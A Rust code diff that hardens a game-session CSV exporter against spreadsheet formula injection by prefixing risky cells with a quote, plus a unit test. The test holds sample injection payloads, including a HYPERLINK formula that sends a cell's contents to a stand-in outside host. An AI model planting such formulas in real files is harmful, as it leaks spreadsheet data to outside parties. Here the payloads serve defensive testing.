@@ -475,6 +475,18 @@ pub fn export_json(session: &Session, names: &NameCache) -> Result<String, Store
 }
 
 /// Exports the timeline as CSV (one row per kill/death/vehicle event).
+/// A text cell of the CSV export. Names come from Census or from an imported
+/// session file (anyone can hand one around); a spreadsheet program would run
+/// a cell starting with `=`, `+`, `-`, `@`, tab or CR as a formula
+/// (`=HYPERLINK(…)`, DDE). Such cells get a leading `'` (OWASP CSV injection).
+fn csv_text(s: &str) -> String {
+    if s.starts_with(['=', '+', '-', '@', '\t', '\r']) {
+        format!("'{s}")
+    } else {
+        s.to_owned()
+    }
+}
+
 pub fn export_csv(session: &Session, names: &NameCache) -> Result<String, StoreError> {
     let mut w = csv::Writer::from_writer(Vec::new());
     w.write_record([
@@ -529,9 +541,9 @@ pub fn export_csv(session: &Session, names: &NameCache) -> Result<String, StoreE
             e.timestamp.to_string(),
             kind.to_owned(),
             other.to_string(),
-            other_name.to_owned(),
+            csv_text(other_name),
             weapon.to_string(),
-            weapon_name.to_owned(),
+            csv_text(weapon_name),
             u8::from(hs).to_string(),
             vehicle.to_string(),
         ])?;
@@ -796,5 +808,24 @@ mod tests {
         );
         let json = export_json(&s, &names).unwrap();
         assert!(json.contains("\"Gauss SAW\""));
+    }
+
+    #[test]
+    fn csv_cells_are_not_formulas() {
+        let s = sample();
+        let mut names = NameCache::default();
+        names
+            .items
+            .insert(80, "=HYPERLINK(\"https://example.org/\"&A1)".into());
+        names.characters.insert(2, ("@SUM(1+1)".into(), 1));
+        let csv = export_csv(&s, &names).unwrap();
+        let row = csv.lines().nth(1).unwrap();
+        assert!(row.contains(",'@SUM(1+1),"), "{row}");
+        assert!(row.contains("\"'=HYPERLINK("), "{row}");
+        for t in ["+1", "-1", "\tx", "\rx"] {
+            assert!(csv_text(t).starts_with('\''), "{t:?}");
+        }
+        assert_eq!(csv_text("Gauss SAW"), "Gauss SAW");
+        assert_eq!(csv_text(""), "");
     }
 }
